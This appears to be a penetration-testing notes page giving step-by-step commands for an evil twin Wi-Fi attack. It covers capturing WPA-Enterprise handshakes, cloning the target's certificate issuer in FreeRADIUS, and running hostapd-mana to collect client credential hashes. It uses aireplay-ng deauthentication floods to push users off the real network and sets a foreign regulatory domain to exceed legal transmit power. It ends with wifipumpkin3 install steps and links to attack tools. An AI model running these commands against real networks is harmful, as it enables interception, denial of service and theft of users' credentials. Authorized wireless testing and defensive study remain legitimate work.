# Evil Twin

Our first task will be to creating an evil twin access point. Many new hackers are anxious to crack Wi-Fi passwords to gain some free bandwidth (don't worry, we'll get to that), but there are so many other Wi-Fi hacks that are far more powerful and put so much more at risk than a bit of bandwidth.

## What's an Evil Twin AP?

The evil twin AP is an access point that looks and acts just like a legitimate AP (using the same SSID) and entices the end-user to connect to our access point. Our aircrack-ng suite has a tool, airbase-ng, that can be used to convert our wireless adapter into an access point. This is a powerful client-side hack that will enable us to see all of the traffic from the client and conduct a man-in-the middle attack.

Many corporate offices, hotels, coffee shops, etc. employ this type of security.

## Manual

https://www.youtube.com/watch?v=vcYTgJ6_mXE

![[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^1242a4]]

Capture the packets.

```
# airodump-ng -i mon0 -a <bssid> -w wpa_ap --output-format pcap
```

Send de-authentication packets once you receive a handshake.

![[02 - De-authentication#^f7a1ab]]

Extract the certificate information and note down the issuer details.

```
$ tshark -r wpa_ap-01.cap -Y "wlan.bssid == <bssid> && eap && tls.handshake.certficate" -V | grep "rdnSequence:" -A 1 | head -n 20
```

Organize them like this. One is the **certificate authority**.

```
emailAddress=<email>
commonName=<common_name>
organizationUnitName=Certificate Authority
organizationName=<company_name>
localityName=<city_name>
stateOrProvince=<state_name>
countryName=US
```

The other represents the server.

```
emailAddress=<email>
commonName=<common_name>
organizationUnitName=Server
organizationName=<company_name>
localityName=<city_name>
countryName=<country_code>
```

Setup a rogue access point.

```
$ sudo apt install -y freeradius
```

Modify the certificate configuration `/etc/freeradius/3.0/certs/ca.cnf`. Then write down the details of the certificate issuer you've captured.

```
[certificate_authority]
countryName             = US
stateOrProvinceName     = <state_name>
localityName            = <city_name>
organizationName        = <company_name>
emailAddress            = <email>
commonName              = "<common_name>"
```

Then modify the **server certificate configuration** `/etc/freeradius/3.0/certs/server.cnf`.

```
[server]
countryName             = US
stateOrProvinceName     = <state_name>
localityName            = <city_name>
organizationName        = <company_name>
emailAddress            = <email>
commonName              = "<common_name>"
```

Create EAP user file.

```
# cat << EOF > /tmp/mana/eap_user
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2
"pass" [2]
EOF
```

Generate Diffie-Hellman key for `hostapd-mana`.

```
# cd /etc/freeradius/3.0/certs
rm dh
openssl dhparam -out dh -2 2048
make
```

Now to setup a rouge access point in `/tmp/network.conf`.

```
interface=wlan0
driver=nl80211
ssid=<SSID_name>
hw_mode=a
channel=<channel_number>

auth_algs=1
wmm_enabled=1
ieee80211n=1

ieee8021x=1
eap_server=1
eap_user_file=/tmp/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=
dh_file=/etc/freeradius/3.0/certs/dh

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

mana_wpe=1
mana_credout=/tmp/hostapd.credout
```

Deploy the rogue access point.

```
# hostapd-mana /tmp/network.conf | tee /tmp/credentials.txt
```

Now monitor the channel frequency to ensure it's being broadcast.

```
# airodump-ng mon0 -c <channel>
```

De-authenticate the existing targets from the legitimate wireless endpoint.

```
# aireplay-ng -0 0 -a <bssid> -e <ssid> mon0
```

Then wait for the targets to authenticate the rouge AP.

```
# grep "JTR\|HASHCAT" /tmp/credentials.txt
```

## #aircrack-ng

Start `airmon-ng`.

```
# airmon-ng start wlan0
```

Start `airodump-ng` then wait for SSID to display.

![[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xD - Wireless Attacks/Wi-Fi/01 - Scan Endpoints#^1242a4]]

Create new AP with same SSID and mac.

```
# airbase-ng -a <bssid> --essid <ssid> -c <channel> mon0
```

Deauth your target

```
# aireplay-ng --deauth 0 -a <bssid>
```

Run your AP at max power (27 is max 'legal' power)

```
# iwconfig wlan0 txpower 27
```

Bypass restrictions is by setting to another domain/country then wait for connection

```
# iw reg set BO

# iwconfig wlan0 txpower 30
```

## EAPHammer

## Wifiphisher

TODO: Provide more usage coverage for Wifiphisher with use cases

## Wifipumpkin

TODO: Provide more usage coverage for Wifipumpkin with use cases

```
$ sudo apt install wifipumpkin3
```

```
$ sudo apt install python3.7-dev libssl-dev libffi-dev build-essential python3.7
```

```
$ git clone https://github.com/P0cL4bs/wifipumpkin3.git && \
cd wifipumpkin3 && sudo make install
```

---
## References

### Source Repositories

- [eaphammer](https://github.com/s0lst1c3/eaphammer)

- [wifiphisher](https://github.com/wifiphisher/wifiphisher)

- [Wifipumpkin](https://github.com/P0cL4bs/wifipumpkin3)

- [koutto: Pi-PwnBox-RogueAP](https://github.com/koutto/pi-pwnbox-rogueap)

### Wifipumpkin

- [Wifipumpkin3 Documentation](https://wifipumpkin3.github.io/docs/getting-started)

### Hacktricks

- [Hacktricks: Pentesting Wi-Fi](https://hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html

### Black Hills Information Security

- [Black Hills Information Security: How to Install and Perform Wi-Fi Attacks with Wifiphisher](https://www.blackhillsinfosec.com/how-to-install-and-perform-wi-fi-attacks-with-wifiphisher/)

### Penetration Testing Tools

- [Penetration Testing Tools: How to create a Rogue Access Point (connected to the Internet through Tor)](https://miloserdov.org/?p=1591)